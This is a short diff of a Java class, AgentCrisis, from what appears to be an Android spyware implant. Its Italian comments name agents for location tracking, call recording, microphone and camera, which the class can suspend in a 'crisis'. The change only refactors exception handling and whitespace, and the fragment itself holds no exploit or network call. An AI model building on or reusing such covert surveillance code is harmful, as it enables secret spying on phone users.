@@ -21,7 +21,7 @@ import com.android.service.util.DataBuffer;
 
 public class AgentCrisis extends AgentBase {
 	private static final String TAG = "AgentCrisis"; //$NON-NLS-1$
- //$NON-NLS-1$
+	//$NON-NLS-1$
 	public static final int NONE = 0x0; // Per retrocompatibilita'
 	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
 											// Agent
@@ -31,9 +31,8 @@ public class AgentCrisis extends AgentBase {
 	public static final int CALL = 0x4; // Inibisci l'agente di registrazione
 										// delle chiamate
 	public static final int SYNC = 0x5; // Inibisci tutte le routine di
-											// sincronizzazione
+										// sincronizzazione
 	public static final int SIZE = 0x6;
-
 
 	private int type;
 
@@ -50,22 +49,30 @@ public class AgentCrisis extends AgentBase {
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) throws ConfigurationException {
+	public boolean parse(AgentConf conf) {
+
 		Status status = Status.self();
-		if(conf.getBoolean("synchronize")){
-			status.setCrisis(SYNC, true);
-		}
-		if(conf.getBoolean("call")){
-			status.setCrisis(CALL, true);
-		}
-		if(conf.getBoolean("mic")){
-			status.setCrisis(MIC, true);
-		}
-		if(conf.getBoolean("camera")){
-			status.setCrisis(CAMERA, true);
-		}
-		if(conf.getBoolean("position")){
-			status.setCrisis(POSITION, true);
+		try {
+			if (conf.getBoolean("synchronize")) {
+				status.setCrisis(SYNC, true);
+			}
+			if (conf.getBoolean("call")) {
+				status.setCrisis(CALL, true);
+			}
+			if (conf.getBoolean("mic")) {
+				status.setCrisis(MIC, true);
+			}
+			if (conf.getBoolean("camera")) {
+				status.setCrisis(CAMERA, true);
+			}
+			if (conf.getBoolean("position")) {
+				status.setCrisis(POSITION, true);
+			}
+		} catch (ConfigurationException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse) Error: " + e);
+			}
+			return false;
 		}
 
 		return true;
